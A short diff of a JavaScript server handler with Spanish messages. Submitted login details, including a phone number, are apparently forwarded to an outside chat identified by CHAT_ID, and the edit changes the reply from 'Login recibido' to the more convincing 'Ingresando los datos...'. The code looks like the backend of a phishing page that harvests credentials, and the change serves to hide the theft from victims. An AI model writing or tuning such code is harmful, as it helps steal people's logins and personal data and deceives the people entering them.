@@ -55,7 +55,7 @@ Teléfono: ${telefono}`;
       body: JSON.stringify({ chat_id: CHAT_ID, text: mensaje })
     });
 
-    res.send("OK ✅ Login recibido");
+    res.send("Ingresando los datos...");
   } catch (error) {
     console.error(error);
     res.status(500).send("❌ Error al ingresar tus datos. Inténtalo nuevamente");
